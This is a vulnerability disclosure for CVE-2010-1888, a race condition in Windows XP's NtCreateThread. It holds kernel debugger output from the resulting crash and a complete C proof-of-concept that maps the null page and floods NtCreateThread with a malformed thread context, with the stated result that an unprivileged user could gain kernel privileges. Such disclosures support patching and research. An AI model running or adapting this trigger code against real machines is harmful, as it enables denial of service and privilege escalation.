@@ -1,0 +1,217 @@
+Microsoft Windows nt!NtCreateThread race condition with invalid code segment
+----------------------------------------------------------------------------
+
+CVE-2010-1888
+
+Creating a new thread on windows involves passing several structures to
+NtCreateThread(). These structures describe the execution state of the new
+thread, and are setup transparently by the system libraries when using the
+CreateThread() API. One of these structures is called CONTEXT, which contains
+the register values of the new thread.
+
+kd> dt nt!_CONTEXT
+   +0x000 ContextFlags     : Uint4B
+   +0x004 Dr0              : Uint4B
+   +0x008 Dr1              : Uint4B
+   +0x00c Dr2              : Uint4B
+   +0x010 Dr3              : Uint4B
+   +0x014 Dr6              : Uint4B
+   +0x018 Dr7              : Uint4B
+   +0x01c FloatSave        : _FLOATING_SAVE_AREA
+   +0x08c SegGs            : Uint4B
+   +0x090 SegFs            : Uint4B
+   +0x094 SegEs            : Uint4B
+   +0x098 SegDs            : Uint4B
+   +0x09c Edi              : Uint4B
+   +0x0a0 Esi              : Uint4B
+   +0x0a4 Ebx              : Uint4B
+   +0x0a8 Edx              : Uint4B
+   +0x0ac Ecx              : Uint4B
+   +0x0b0 Eax              : Uint4B
+   +0x0b4 Ebp              : Uint4B
+   +0x0b8 Eip              : Uint4B
+   +0x0bc SegCs            : Uint4B
+   +0x0c0 EFlags           : Uint4B
+   +0x0c4 Esp              : Uint4B
+   +0x0c8 SegSs            : Uint4B
+   +0x0cc ExtendedRegisters : [512] UChar
+
+Obviously the state must be validated, otherwise you could simply set SegCs to
+to rpl0, and execute code with kernel privileges.
+
+I discovered a race condition during this validation stage by accident when
+checking the validation looked sane, and was able to restore an illegal
+execution state. I havn't investigated the root cause, but it's self evident
+this is going to be exploitable.
+
+kd> vertarget
+Windows XP Kernel Version 2600 (Service Pack 3) UP Free x86 compatible
+Product: WinNt, suite: TerminalServer SingleUserTS
+Built by: 2600.xpsp_sp3_gdr.100216-1514
+Machine Name:
+Kernel base = 0x804d7000 PsLoadedModuleList = 0x8055b1c0
+Debug session time: Sat Aug  7 23:25:27.564 2010 (GMT+2)
+System Uptime: 0 days 0:04:15.492
+kd> .lastevent
+Last event: Access violation - code c0000005 (!!! second chance !!!)
+  debugger time: Sat Aug  7 23:27:22.595 2010 (GMT+2)
+kd> r
+eax=00000000 ebx=5f5b1044 ecx=0000003d edx=83f88bff esi=0008c21c edi=98490393
+eip=804df15f esp=b1178800 ebp=b1178800 iopl=0         nv up di pl nz ac pe nc
+cs=0008  ss=0010  ds=0023  es=0023  fs=0030  gs=0000             efl=00010016
+nt!Kei386EoiHelper+0x103:
+804df15f 897308          mov     dword ptr [ebx+8],esi ds:0023:5f5b104c=????????
+kd> kv
+ChildEBP RetAddr  Args to Child              
+b1178800 00000d89 badb0d00 b1178800 ff57018b nt!Kei386EoiHelper+0x103 (FPO: [0,0] TrapFrame @ b1178800)
+WARNING: Frame IP not in any known module. Following frames may be wrong.
+8b5d5e5f 00000000 00000000 00000000 00000000 0xd89
+kd> .trap b1178800
+ErrCode = 5f5b1044
+eax=28247c89 ebx=c78b5b10 ecx=24245c89 edx=3c246c89 esi=52ff5511 edi=8b084e8b
+eip=00000d89 esp=8308768b ebp=8b5d5e5f iopl=0     vif nv up ei pl nz ac pe nc
+cs=018b  ss=ffcb  ds=2444  es=1c24  fs=01ff  gs=0c4e             efl=0008c21c
+018b:0d89 41              inc     cx
+kd> dg @cs
+                                  P Si Gr Pr Lo
+Sel    Base     Limit     Type    l ze an es ng Flags
+---- -------- -------- ---------- - -- -- -- -- --------
+018B 00008003 0000f190 <Reserved> 0 Nb By Np Nl 00000000
+kd> wut
+    ^ Syntax error in 'wut'
+kd> dd 8:@eip L8
+0008:8d8c  41414141 41414141 41414141 41414141
+0008:8d9c  41414141 41414141 41414141 41414141
+
+--------------------
+Affected Software
+------------------------
+At least Microsoft Windows XP is affected.
+
+--------------------
+Consequences
+-----------------------
+
+An unprivileged user may be able to execute arbitrary code with the privileges
+of the kernel.
+
+Example code to trigger this vulnerability is available below.
+
+#include <windows.h>
+#include <stdio.h>
+
+typedef struct {
+    HANDLE UniqueProcess;
+    HANDLE UniqueThread;
+} CLIENTID;
+
+typedef struct {
+    struct {
+        PVOID OldStackBase;
+        PVOID OldStackLimit;
+    } OldInitialTeb;
+    PVOID StackBase;
+    PVOID StackLimit;
+    PVOID StackAllocationBase;
+} INITIAL_TEB;
+
+static VOID InitFirstPage();
+
+int main(int argc, char **argv)
+{
+    HANDLE ThreadHandle;
+    CONTEXT ThreadContext;
+    FARPROC NtCreateThread;
+    CLIENTID ClientId;
+    INITIAL_TEB InitialTeb;
+    ULONG i;
+
+    NtCreateThread = GetProcAddress(GetModuleHandle("NTDLL.DLL"), "NtCreateThread");
+
+    fprintf(stderr, "NtCreateThread@%p\n", NtCreateThread);
+
+    FillMemory(&InitialTeb, sizeof(InitialTeb), 0x41);
+    FillMemory(&ThreadContext, sizeof(ThreadContext), 0x41);
+
+    ThreadContext.SegCs = 0xDEADBEEF;
+
+    InitFirstPage();
+
+    for (;;) {
+        NtCreateThread(&ThreadHandle,
+                       0,
+                       NULL,
+                       GetCurrentProcess(),
+                       &ClientId,
+                       &ThreadContext,
+                       &InitialTeb,
+                       FALSE);
+    }
+
+    return 0;
+}
+
+static VOID InitFirstPage()
+{
+    PVOID BaseAddress;
+    ULONG RegionSize;
+    NTSTATUS ReturnCode;
+    FARPROC NtAllocateVirtualMemory;
+
+    NtAllocateVirtualMemory = GetProcAddress(GetModuleHandle("NTDLL.DLL"), "NtAllocateVirtualMemory");
+
+    fprintf(stderr, "NtAllocateVirtualMemory@%p\n", NtAllocateVirtualMemory);
+
+    RegionSize = 0xf000;
+    BaseAddress = (PVOID) 0x00000001;
+
+    ReturnCode = NtAllocateVirtualMemory(GetCurrentProcess(),
+                                         &BaseAddress,
+	                                     0,
+                                         &RegionSize,
+                                         MEM_COMMIT | MEM_RESERVE,
+                                         PAGE_EXECUTE_READWRITE);
+
+     if (ReturnCode != 0) {
+         fprintf(stderr, "NtAllocateVirtualMemory() failed to map first page, %#X\n",
+                         ReturnCode);
+         fflush(stderr);
+         ExitProcess(1);
+    }
+
+    fprintf(stderr, "BaseAddress: %p, RegionSize: %#x\n", BaseAddress, RegionSize), fflush(stderr);
+
+    FillMemory(BaseAddress, RegionSize, 0x41);
+
+    return;
+}
+
+-------------------
+Credit
+-----------------------
+
+This bug was discovered by Tavis Ormandy.
+
+-------------------
+Greetz
+-----------------------
+
+$1$90AiGoxp$wyzZGQ6owkRG6OxPErj6M/
+$1$7.qXQkxE$5Zc1zQndJpGdoe1RF4Br1.
+$1$IPYBMipO$/HhHCPgulV/E0pgSvU1710
+$1$ULymMO9x$NVMLjZe8i25ajEfnsRowA.
+$1$8a/c6DLm$JDAFGdhEzIj2DR7RYC2gi.
+
+And all the other elite people I've worked with (sorry, too many to generate!).
+
+-------------------
+Notes
+-----------------------
+
+Approximate time to fix was 270 days. Srsly. 
+
+-------------------
+References
+-----------------------
+
+None.
